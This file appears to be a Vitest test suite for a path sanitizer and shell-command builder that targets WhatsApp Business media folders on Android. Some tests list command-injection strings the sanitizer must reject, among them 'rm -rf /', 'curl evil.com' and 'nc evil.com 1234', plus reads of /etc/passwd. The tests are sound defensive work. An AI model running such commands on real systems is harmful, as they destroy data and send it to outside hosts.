import { describe, expect, it } from 'vitest'
import {
  DEFAULT_VOICE_NOTES_PATH,
  DEFAULT_IMAGES_PATH,
  DEFAULT_DOCUMENTS_PATH,
  sanitizeAndroidStoragePath,
  isValidAndroidStoragePath,
  buildAudioShellCommand,
  buildImageShellCommand,
  buildDocumentPathTemplate,
} from './android-media-paths'

describe('default paths', () => {
  it('6. default voice notes path is the physically validated Fase 8/9 folder', () => {
    expect(DEFAULT_VOICE_NOTES_PATH).toBe(
      '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Voice Notes',
    )
  })

  it('7. default images path is the physically validated Fase 8/9 folder', () => {
    expect(DEFAULT_IMAGES_PATH).toBe(
      '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images',
    )
  })

  it('8. default documents path is the physically validated Fase 8/9 folder', () => {
    expect(DEFAULT_DOCUMENTS_PATH).toBe(
      '/storage/emulated/0/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Documents',
    )
  })

  it('every default path is itself valid', () => {
    expect(isValidAndroidStoragePath(DEFAULT_VOICE_NOTES_PATH)).toBe(true)
    expect(isValidAndroidStoragePath(DEFAULT_IMAGES_PATH)).toBe(true)
    expect(isValidAndroidStoragePath(DEFAULT_DOCUMENTS_PATH)).toBe(true)
  })
})

describe('sanitizeAndroidStoragePath', () => {
  it('9. spaces inside a legitimate folder name are preserved, not rejected', () => {
    expect(sanitizeAndroidStoragePath(DEFAULT_IMAGES_PATH)).toBe(DEFAULT_IMAGES_PATH)
  })

  it('trims incidental leading/trailing whitespace as normalization', () => {
    expect(sanitizeAndroidStoragePath(`  ${DEFAULT_IMAGES_PATH}  `)).toBe(DEFAULT_IMAGES_PATH)
  })

  it('10. a newline anywhere in the path is rejected', () => {
    expect(sanitizeAndroidStoragePath(`${DEFAULT_IMAGES_PATH}\n/evil`)).toBeNull()
    expect(sanitizeAndroidStoragePath(`/storage/emulated/0/foo\r\nbar`)).toBeNull()
  })

  it('a null byte anywhere in the path is rejected', () => {
    expect(sanitizeAndroidStoragePath(`${DEFAULT_IMAGES_PATH}\0/evil`)).toBeNull()
  })

  it('11. shell metacharacters / command-injection attempts are rejected', () => {
    const attempts = [
      '/storage/emulated/0/foo; rm -rf /',
      '/storage/emulated/0/foo && curl evil.com',
      '/storage/emulated/0/foo | nc evil.com 1234',
      '/storage/emulated/0/foo$(whoami)',
      '/storage/emulated/0/foo`whoami`',
      '/storage/emulated/0/foo > /data/leak',
      '/storage/emulated/0/foo < /etc/passwd',
      '/storage/emulated/0/"; rm -rf ~ #',
      "/storage/emulated/0/'; rm -rf ~ #",
      '/storage/emulated/0/foo\\bar',
      '/storage/emulated/0/foo*bar',
      '/storage/emulated/0/foo?bar',
      '/storage/emulated/0/foo[bar]',
      '/storage/emulated/0/foo{bar}',
    ]
    for (const attempt of attempts) {
      expect(sanitizeAndroidStoragePath(attempt), attempt).toBeNull()
    }
  })

  it('12. a path outside /storage/emulated/0/ is rejected', () => {
    expect(sanitizeAndroidStoragePath('/storage/emulated/1/WhatsApp')).toBeNull()
    expect(sanitizeAndroidStoragePath('/sdcard/WhatsApp')).toBeNull()
    expect(sanitizeAndroidStoragePath('storage/emulated/0/WhatsApp')).toBeNull() // no leading slash
    expect(sanitizeAndroidStoragePath('/storage/emulated/0/')).toBeNull()        // prefix only, no folder
  })

  it('rejects path traversal attempts even though "." and "-" are individually allowed', () => {
    expect(sanitizeAndroidStoragePath('/storage/emulated/0/foo/../../etc')).toBeNull()
  })

  it('rejects a trailing slash', () => {
    expect(sanitizeAndroidStoragePath(`${DEFAULT_IMAGES_PATH}/`)).toBeNull()
  })

  it('rejects non-string input without throwing', () => {
    // @ts-expect-error deliberate invalid input
    expect(sanitizeAndroidStoragePath(null)).toBeNull()
    // @ts-expect-error deliberate invalid input
    expect(sanitizeAndroidStoragePath(undefined)).toBeNull()
  })
})

describe('shell/template builders', () => {
  it('13. audio shell command matches the physically validated Fase 8/9 one-liner exactly', () => {
    expect(buildAudioShellCommand(DEFAULT_VOICE_NOTES_PATH)).toBe(
      `ls -t "${DEFAULT_VOICE_NOTES_PATH}"/*/*.opus 2>/dev/null | head -n 1`,
    )
  })

  it('14. image shell command matches the physically validated Fase 8/9 one-liner exactly', () => {
    expect(buildImageShellCommand(DEFAULT_IMAGES_PATH)).toBe(
      `ls -t "${DEFAULT_IMAGES_PATH}"/*.jpg 2>/dev/null | head -n 1`,
    )
  })

  it('15. document path template matches the physically validated Fase 8/9 form exactly', () => {
    expect(buildDocumentPathTemplate(DEFAULT_DOCUMENTS_PATH)).toBe(
      `${DEFAULT_DOCUMENTS_PATH}/[rn_filename]`,
    )
  })

  it('every builder returns null instead of a shell string when the path is invalid', () => {
    expect(buildAudioShellCommand('/storage/emulated/0/foo; rm -rf /')).toBeNull()
    expect(buildImageShellCommand('/storage/emulated/0/foo; rm -rf /')).toBeNull()
    expect(buildDocumentPathTemplate('/storage/emulated/0/foo; rm -rf /')).toBeNull()
  })

  it('the generated shell command always double-quotes the path', () => {
    const withSpaces = `${DEFAULT_VOICE_NOTES_PATH}`
    const cmd = buildAudioShellCommand(withSpaces)
    expect(cmd).toContain(`"${withSpaces}"`)
  })
})
